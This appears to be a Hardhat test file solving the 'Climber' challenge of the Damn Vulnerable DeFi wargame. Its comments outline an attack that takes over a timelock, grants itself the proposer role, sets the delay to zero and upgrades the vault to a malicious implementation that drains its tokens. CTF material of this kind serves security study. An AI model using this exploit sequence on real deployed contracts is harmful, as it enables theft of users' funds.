const { ethers, upgrades } = require("hardhat")
const { expect } = require("chai")
const { BigNumber } = require("ethers")

describe("[Challenge] Climber", function () {
    let deployer, proposer, sweeper, attacker

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, proposer, sweeper, attacker] = await ethers.getSigners()

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ])
        expect(await ethers.provider.getBalance(attacker.address)).to.equal(
            ethers.utils.parseEther("0.1")
        )

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory("ClimberVault", deployer),
            [deployer.address, proposer.address, sweeper.address],
            { kind: "uups" }
        )

        expect(await this.vault.getSweeper()).to.eq(sweeper.address)
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0")
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero)
        expect(await this.vault.owner()).to.not.eq(deployer.address)

        // Instantiate timelock
        let timelockAddress = await this.vault.owner()
        this.timelock = await (
            await ethers.getContractFactory("ClimberTimelock", deployer)
        ).attach(timelockAddress)

        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true

        // Deploy token and transfer initial token balance to the vault
        this.token = await (
            await ethers.getContractFactory("DamnValuableToken", deployer)
        ).deploy()
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Call ClimberTimelock.execute() to do these things:
        // 1) updateDelay() and set the delay it to 0
        // 2) _setupRole() to make our attack contract the proposer
        // 3) call our attack contract to schedule() the operation, this will make sure everything will not be reverted
        // 4) As the owner of the Vault, trigger upgradeTo() to upgrade the Vault to a malicious implementation and pass data to sweep the funds

        const solver = await (
            await ethers.getContractFactory("ClimberSolver", attacker)
        ).deploy(this.timelock.address, this.vault.address, this.token.address, attacker.address)

        await solver.attack()
        const hasRoleProposer = await this.timelock.hasRole(
            await this.timelock.PROPOSER_ROLE(),
            solver.address
        )
        console.log(`hasRoleProposer = ${hasRoleProposer}`)

        const attackerTokenBalance = await this.token.balanceOf(attacker.address)
        console.log(`Attacker Balance = ${ethers.utils.formatEther(attackerTokenBalance)} DVT`)
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq("0")
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE)
    })
})
